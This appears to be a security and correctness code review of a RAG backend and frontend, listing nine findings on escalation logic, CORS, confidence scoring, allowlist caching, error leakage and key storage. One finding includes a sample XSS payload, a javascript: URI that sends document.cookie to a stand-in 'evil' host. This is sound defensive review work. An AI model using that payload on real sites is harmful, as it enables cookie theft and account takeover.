# Code review — 2026-09-19

Scope: `backend/` and `frontend/` (all files, new this diff — RAG engine + UI, step 11 of the AIDLC build plan).
Effort: high. Note on diff scope: this repo lives inside a larger git root
(`/home/labuser/Downloads/handson`) in which the entire `day 4` directory —
including this project's `backend/` and `frontend/` — is untracked, so there
is no prior committed revision to diff against. The review target is the
current on-disk content of `backend/` and `frontend/` in full.

Focus criteria: (1) fabricated citations / ungrounded claims, (2) retrieval
bypassing `require_allowed()`/the allowlist, (3) non-schema-valid response
shapes, (4) escalation/`insufficient_evidence` logic failing closed rather
than fabricating under weak evidence, plus general correctness/security.

Direct findings on the four focus criteria:
- (1) fabrication: none found — every citation traces to an actual retrieval
  result from an allowlisted client; `grounding.py` never emits a claim
  without real results.
- (2) allowlist bypass: none found — every retrieval client
  (`pubmed.py`, `pubchem.py`, `clinicaltrials.py`, `opentargets.py`,
  `openfda.py`) calls `require_allowed()` immediately before its HTTP
  request, and `AllowlistError` is never caught-and-ignored.
- (3) schema validation: `main.py` and `orchestrator.py` both gate on
  `validate_response()`, but see finding #4 below — the second check is
  dead code and the real failure path is uncaught.
- (4) escalation fail-closed: see finding #1 below — the general case of
  "one requested domain came back empty (not blocked) while another
  produced claims" is not handled per `escalation-rules.md`, and finding #2
  shows the confidence heuristic can inflate single-source evidence to
  "high" confidence, which also feeds into whether escalation triggers.

## Findings (JSON)

```json
[
  {
    "file": "backend/src/orchestrator/orchestrator.py",
    "line": 205,
    "summary": "Escalation logic only handles the clinical+blocked partial-evidence case; when any requested domain returns zero results without being blocked while another domain succeeds, the response is returned as \"answered\" instead of \"insufficient_evidence\".",
    "failure_scenario": "Query \"chemical structure and clinical trial safety of compound X\" classifies to [CHEMICAL, CLINICAL]. PubChem finds the compound (claims non-empty) while clinicaltrials.search and openfda.search_safety both genuinely return zero hits (a novel, not-yet-trialed compound) with no AllowlistError. `clinical_blocked` is empty so the first `if` in `_apply_escalation` (line ~184) doesn't fire, `weak_safety_claims` is empty (no clinical claim exists at all), so `if claims: return \"answered\"` (line 205-206) fires — the UI shows a fully-confident green \"Answered\" banner while the entire clinical/safety half of the question was silently dropped, contradicting escalation-rules.md row 2 (\"at least one claim can't be cited\" -> insufficient_evidence)."
  },
  {
    "file": "backend/src/api/main.py",
    "line": 25,
    "summary": "No CORS middleware is configured, so the shipped frontend cannot call the shipped backend from a normal cross-origin deployment.",
    "failure_scenario": "Following frontend/README.md (serve frontend via a static file server) and backend's own docstring (`uvicorn ... --reload`, no port override) puts frontend and backend on different origins. `POST /query` sends `Content-Type: application/json`, which is a non-simple request requiring a CORS preflight; with no `Access-Control-Allow-Origin` response header, the browser blocks the response, `fetch()` in app.js throws, and `runQuery()` reports \"Could not reach backend\" even though the backend is running and reachable at the network layer."
  },
  {
    "file": "backend/src/grounding/grounding.py",
    "line": 31,
    "summary": "The corroboration-count confidence heuristic counts distinct citation URLs, not distinct sources/hosts, so multiple hits from a single client count as independently corroborating evidence.",
    "failure_scenario": "For a TARGET query where opentargets.py is blocked (current allowlist gap, per its own module docstring), only pubmed.search contributes. If PubMed returns 3 distinct article URLs for the same underlying finding, `_confidence_from_corroboration(3)` returns \"high\" even though all 3 citations are from one host/client — not the \"more independent allowlisted sources agreeing\" semantics the module docstring (lines 9-21) claims, and this inflated confidence can be the deciding factor in whether escalation triggers for a weak-evidence answer."
  },
  {
    "file": "backend/src/utils/allowlist.py",
    "line": 46,
    "summary": "`reload_allowlist()` exists to pick up a human-approved edit to data/allowlist/sources.json but is never called anywhere in the codebase, so a running backend process keeps serving a stale, `lru_cache`d allowlist.",
    "failure_scenario": "A human approves adding `api.platform.opentargets.org` to sources.json (the exact workflow described in allowlist.md and opentargets.py's module docstring, which promises the client \"will start working immediately with zero code changes\"). The running FastAPI process still has the old allowlist cached via `@lru_cache(maxsize=1)` on `_load_allowlist()`; every subsequent `require_allowed()` call keeps raising `AllowlistError` for that host until the process is restarted, silently breaking the promised zero-code-change activation."
  },
  {
    "file": "backend/src/api/main.py",
    "line": 52,
    "summary": "The \"belt-and-suspenders\" re-validation in /query is dead code: run_query() already validates and raises before returning, so the real SchemaValidationError path is never caught by this try/except and instead becomes an unhandled 500.",
    "failure_scenario": "If an assembled response ever fails schema validation, `orchestrator.run_query()` (which calls `validate_response(response)` internally before its `return response`) raises `SchemaValidationError` there, uncaught, which propagates out of the `response = run_query(body.query)` call at line 47 — a line with no try/except around it — producing a generic unhandled-exception 500 instead of the intended `HTTPException(500, detail=...)` with the schema-error detail. The subsequent `try: validate_response(response) except SchemaValidationError` block at lines 52-58 can only be reached with an already-known-valid `response`, so it can never actually raise."
  },
  {
    "file": "backend/src/utils/allowlist.py",
    "line": 108,
    "summary": "AllowlistError messages embed the absolute server filesystem path (ALLOWLIST_PATH) and the full list of allowed hosts, and these strings flow directly into escalation.reason returned to API clients and rendered in the UI.",
    "failure_scenario": "A clinical query hits a blocked source (openfda.py, currently blocked per the known allowlist gap); `require_allowed()` raises `AllowlistError(f\"...in {ALLOWLIST_PATH}. Allowed hosts...: {allowed_hosts}.\")`, `_retrieve_domain` (orchestrator.py) stores `str(exc)` in `blocked`, and `_apply_escalation` splices it verbatim into `escalation.reason`, which `main.py` returns in the JSON response and `frontend/app.js` renders unescaped-but-visible in the escalation-reason box — leaking the server's absolute directory path (including the local username) to any end user who triggers escalation."
  },
  {
    "file": "frontend/app.js",
    "line": 365,
    "summary": "escapeAttr() only escapes double quotes before a citation URL is interpolated into an href attribute, so a javascript: URI is rendered as a live, clickable link rather than being neutralized.",
    "failure_scenario": "If any allowlisted upstream API response ever contains (or is manipulated/compromised into containing) a citation URL like `javascript:fetch('//evil/?c='+document.cookie)`, `escapeAttr` passes it through unchanged (no quote to escape), `renderClaim()` builds `href=\"javascript:...\"`, and a user clicking that citation link executes attacker script in the page's origin."
  },
  {
    "file": "backend/src/api/main.py",
    "line": 67,
    "summary": "POST /settings/provider-key has no authentication and stores the raw provider API key to disk without restrictive file permissions.",
    "failure_scenario": "On a shared host, any local process/user able to read `backend/.runtime/provider_key` (created with the process's default umask, no `os.chmod`) can read another session's plaintext alternate-provider API key; separately, any network client that can reach the backend (no auth check in `set_provider_key`) can overwrite the stored key for all users of that backend instance."
  },
  {
    "file": "frontend/README.md",
    "line": 15,
    "summary": "frontend/README.md's suggested launch command and backend's default uvicorn invocation both default to port 8000, so following both READMEs as written puts the static frontend server and the FastAPI backend on the same port.",
    "failure_scenario": "A new developer runs `python3 -m http.server` from `frontend/` (defaults to port 8000) and separately runs `uvicorn \"backend.src.api.main:app\" --reload` per backend/src/api/main.py's own docstring (lines 3-6, no `--port` given, uvicorn defaults to 8000) — whichever starts second fails to bind the port, and the app.js default `API_BASE_URL = \"http://localhost:8000\"` (app.js line 9) ends up pointed at whichever server actually won the port."
  }
]
```
